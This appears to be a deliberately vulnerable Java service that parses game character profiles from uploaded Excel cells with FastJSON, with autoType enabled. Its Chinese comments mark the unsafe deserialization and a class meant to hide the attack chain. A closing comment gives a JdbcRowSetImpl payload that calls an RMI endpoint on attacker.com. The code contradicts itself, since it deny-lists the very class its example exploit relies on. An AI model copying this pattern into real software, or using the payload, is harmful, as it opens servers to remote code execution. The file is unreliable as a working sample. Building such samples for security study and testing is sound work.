package com.gamestudio.asset.manager;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import org.apache.poi.ss.usermodel.Cell;
import org.apache.poi.ss.usermodel.Row;
import org.apache.poi.ss.usermodel.Sheet;
import org.apache.poi.ss.usermodel.Workbook;
import org.apache.poi.xssf.usermodel.XSSFWorkbook;
import org.springframework.stereotype.Service;

import javax.annotation.PostConstruct;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

/**
 * 桌面游戏资源处理服务
 * 处理用户上传的自定义角色配置文件
 */
@Service
public class GameAssetService {
    private static final String[] DANGEROUS_CLASSES = {"com.sun.rowset.JdbcRowSetImpl", "org.apache.commons.collections4.map.LazyMap"};

    @PostConstruct
    private void init() {
        // 启用特殊功能支持多态类型解析
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        for (String className : DANGEROUS_CLASSES) {
            ParserConfig.getGlobalInstance().addDeny(className);
        }
    }

    /**
     * 处理用户上传的Excel文件
     * @param fileData 文件字节流
     * @return 解析结果
     * @throws IOException IO异常
     */
    public List<CharacterProfile> importCharacterProfiles(byte[] fileData) throws IOException {
        List<CharacterProfile> profiles = new ArrayList<>();
        try (Workbook workbook = new XSSFWorkbook(new ByteArrayInputStream(fileData))) {
            Sheet sheet = workbook.getSheetAt(0);
            for (Row row : sheet) {
                if (row.getRowNum() == 0) continue; // 跳过标题行
                
                Cell profileCell = row.getCell(2); // 第三列存储角色配置
                if (profileCell == null) continue;
                
                String profileJson = profileCell.getStringCellValue();
                if (profileJson == null || profileJson.isEmpty()) continue;
                
                // 存在漏洞的反序列化操作
                CharacterProfile profile = parseProfile(profileJson);
                if (profile != null) {
                    profiles.add(profile);
                }
            }
        }
        return profiles;
    }

    /**
     * 使用FastJSON进行反序列化
     * @param json JSON字符串
     * @return 解析后的角色配置对象
     */
    private CharacterProfile parseProfile(String json) {
        try {
            // 漏洞点：未严格限制反序列化类型
            return JSON.parseObject(json, CharacterProfile.class, Feature.DisableSpecialKeyDetect);
        } catch (Exception e) {
            // 隐藏潜在错误信息
            System.err.println("[资产解析警告] 忽略无效配置");
            return null;
        }
    }

    /**
     * 角色配置基类
     * 包含游戏内角色的通用属性
     */
    public static class CharacterProfile {
        private String name;
        private int level;
        private String equipment;
        private String specialAbility;
        
        // Getters and Setters
        public String getName() { return name; }
        public void setName(String name) { this.name = name; }
        
        public int getLevel() { return level; }
        public void setLevel(int level) { this.level = level; }
        
        public String getEquipment() { return equipment; }
        public void setEquipment(String equipment) { this.equipment = equipment; }
        
        public String getSpecialAbility() { return specialAbility; }
        public void setSpecialAbility(String specialAbility) { this.specialAbility = specialAbility; }
    }

    /**
     * 扩展配置类（用于隐藏攻击链）
     */
    public static class ExtendedProfile extends CharacterProfile {
        private transient Object runtimeData; // 非持久化字段
        
        public Object getRuntimeData() { return runtimeData; }
        public void setRuntimeData(Object runtimeData) { this.runtimeData = runtimeData; }
    }
}

// 漏洞利用示例（攻击者构造的Excel单元格内容）:
// {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://attacker.com:1099/Exploit","autoCommit":true}